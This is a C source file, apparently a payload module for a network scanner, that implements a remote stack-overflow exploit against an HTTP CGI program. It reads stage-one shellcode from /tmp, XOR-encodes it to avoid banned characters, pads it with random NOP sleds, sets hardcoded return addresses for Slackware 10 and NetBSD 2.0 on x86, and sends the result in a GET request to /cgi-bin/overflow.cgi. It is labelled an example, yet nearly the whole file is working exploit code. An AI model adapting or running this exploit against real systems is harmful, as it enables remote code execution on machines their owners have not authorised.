/**********************************************************************
 * Copyright (C) 2005-2006 (Jack Louis) <jack@rapturesecurity.org>    *
 *                                                                    *
 * This program is free software; you can redistribute it and/or      *
 * modify it under the terms of the GNU General Public License        *
 * as published by the Free Software Foundation; either               *
 * version 2 of the License, or (at your option) any later            *
 * version.                                                           *
 *                                                                    *
 * This program is distributed in the hope that it will be useful,    *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of     *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the      *
 * GNU General Public License for more details.                       *
 *                                                                    *
 * You should have received a copy of the GNU General Public License  *
 * along with this program; if not, write to the Free Software        *
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.          *
 **********************************************************************/
/* This is an example http cgi exploit like module */

#ifndef _GNU_SOURCE
# define _GNU_SOURCE
#endif

#include <config.h>

#include <scan_progs/scanopts.h>
#include <scan_progs/scan_export.h>
#include <settings.h>

#include <unilib/xmalloc.h>
#include <unilib/output.h>
#include <unilib/modules.h>
#include <unilib/qfifo.h>

#include <payload_modules/libunirainbow/libunirainbow.h>

#define BANNED "?&#+ \t\f\v\r\n%<>\""

int create_payload(uint8_t **, uint32_t *, void *);
int init_module(mod_entry_t *);
void delete_module(void);

static mod_entry_t *_m=NULL;
static const settings_t *s=NULL;

int init_module(mod_entry_t *m) {
	snprintf(m->license, sizeof(m->license) -1, "GPLv2");
	snprintf(m->author, sizeof(m->author) -1, "jack");
	snprintf(m->desc, sizeof(m->desc) -1, "http 1.1 example exploit");
	m->iver=0x0103;
	m->type=MI_TYPE_PAYLOAD;

	m->param_u.payload_s.sport=-1;
	m->param_u.payload_s.dport=80;
	m->param_u.payload_s.proto=IPPROTO_TCP;
	m->param_u.payload_s.payload_group=3;

	_m=m;
	s=_m->s;
	return 1;
}

void delete_module(void) {
	return;
}

static int osfound=0;
static char *os_str=NULL;

static void httpexp_find_os(void *ptr) {
	union {
		void *ptr;
		output_data_t *d;
	} d_u;

	if (ptr == NULL || osfound != 0) return;

	d_u.ptr=ptr;

	if (d_u.d->type == OD_TYPE_OS) {
		osfound=1;
		DBG(M_SND, "OS %s", d_u.d->t_u.os);
		os_str=xstrdup(d_u.d->t_u.os);
	}
}

int create_payload(uint8_t **data, uint32_t *dlen, void *ir) {
	union {
		void *ptr;
		ip_report_t *ir;
	} i_u;
	struct __attribute__((packed)) {
		char stuffz[764];
		char thorn[71]; /* 16 * 4 */
		uint32_t eip0;
		uint32_t eip1;
		uint32_t eip2;
		uint32_t null;
		/* ecx is pointing to the Query String= `<i>.... stuff , bounce from libc	*
		 * from call *72(%ecx) at 0x52b48, for example					*/
	} slack10_x86_O2_gcc334_oi;
	struct __attribute__((packed)) {
		char stuffz[976];
		char thorn[18];
		uint32_t eip0;
		uint32_t eip1;
		uint32_t eip2;
		uint32_t eip3;
		uint32_t null;
	} netbsd20_x86_O2_gcc333_oi;
	char *sc=NULL;
	size_t sc_len=0;
	int fd=-1;
	char scbuf[1024], outbuf[2048];
	struct stat sb;

	osfound=0;
	os_str=NULL;

	memset(scbuf, 0, sizeof(scbuf));

	i_u.ptr=ir;
	if (ir == NULL  || i_u.ir->od_q == NULL || i_u.ir->magic != IP_REPORT_MAGIC) {
		PANIC("cant exploit without info");
		return 1;
	}

	fifo_walk(i_u.ir->od_q, httpexp_find_os);

	if (osfound == 0 || os_str == NULL) {
		return 1;
	}

	if (strstr(os_str, "NetBSD") != NULL) {
		VRB(0, "sending NetBSD stage1");

		fd=open("/tmp/netbsd-stage1.bin", O_RDONLY);

		if (fd < 0) {
			PANIC("cant open /tmp/netbsd-stage1.bin");
		}
		if (fstat(fd, &sb) < 0) {
			PANIC("cant stat /tmp/netbsd-stage1.bin");
		}
		if (read(fd, scbuf, sb.st_size) != sb.st_size) {
			PANIC("cant read /tmp/netbsd-stage1.bin");
		}
		close(fd);

		netbsd20_x86_O2_gcc333_oi.eip0=0x0804b010;
		netbsd20_x86_O2_gcc333_oi.eip1=0x0804b010;
		netbsd20_x86_O2_gcc333_oi.eip2=0x0804b010;
	
		memset(netbsd20_x86_O2_gcc333_oi.stuffz, 0x43, sizeof(netbsd20_x86_O2_gcc333_oi.stuffz));

		rand_nops(netbsd20_x86_O2_gcc333_oi.stuffz, sizeof(netbsd20_x86_O2_gcc333_oi.stuffz), BANNED, PLT_NBSDX86);
		sc_len=400;
		sc=encode(scbuf, sb.st_size, BANNED, ENC_XOR, FLG_RAND|FLG_RANDP, PLT_NBSDX86, &sc_len);
		if (sc == NULL) {
			PANIC("Cant create shellcode!");
		}
		memcpy(netbsd20_x86_O2_gcc333_oi.stuffz + (sizeof(netbsd20_x86_O2_gcc333_oi.stuffz) - strlen(sc)), sc, strlen(sc));
		memset(netbsd20_x86_O2_gcc333_oi.thorn, '<', sizeof(netbsd20_x86_O2_gcc333_oi.thorn));
		netbsd20_x86_O2_gcc333_oi.null=0;
	
		snprintf(outbuf, sizeof(outbuf) - 1, "GET /cgi-bin/overflow.cgi?%s HTTP/1.0\r\n\r\n",
				(char *)&netbsd20_x86_O2_gcc333_oi);
	}
	else if (strstr(os_str, "Linux") != NULL) {
		VRB(0, "sending Linux stage1");

		fd=open("/tmp/linux-stage1.bin", O_RDONLY);
		if (fd < 0) {
			PANIC("cant open /tmp/linux-stage1.bin");
		}
		if (fstat(fd, &sb) < 0) {
			PANIC("cant stat /tmp/linux-stage1.bin");
		}
		if (read(fd, scbuf, sb.st_size) != sb.st_size) {
			PANIC("cant read /tmp/linux-stage1.bin");
		}
		close(fd);

		slack10_x86_O2_gcc334_oi.eip0=0xbfffedc0;
		slack10_x86_O2_gcc334_oi.eip1=0xbfffedc0;
		slack10_x86_O2_gcc334_oi.eip2=0xbfffedc0;
	
		rand_nops(slack10_x86_O2_gcc334_oi.stuffz, sizeof(slack10_x86_O2_gcc334_oi.stuffz), BANNED, PLT_LINXX86);
		sc_len=400;
		sc=encode(scbuf, sb.st_size, BANNED, ENC_XOR, FLG_RAND|FLG_RANDP, PLT_LINXX86, &sc_len);
		if (sc == NULL) {
			PANIC("Cant create shellcode!");
		}
		memcpy(slack10_x86_O2_gcc334_oi.stuffz + (sizeof(slack10_x86_O2_gcc334_oi.stuffz) - strlen(sc)), sc, strlen(sc));
		memset(slack10_x86_O2_gcc334_oi.thorn, '<', sizeof(slack10_x86_O2_gcc334_oi.thorn));
		slack10_x86_O2_gcc334_oi.null=0;

		snprintf(outbuf, sizeof(outbuf) -1, "GET /cgi-bin/overflow.cgi?%s HTTP/1.0\r\n\r\n",
				(char *)&slack10_x86_O2_gcc334_oi);
	}
	else {
		return 1;
	}


	*data=(uint8_t *)xstrdup(outbuf);
	*dlen=(uint32_t)strlen((const char *)data);

	return 1;
}
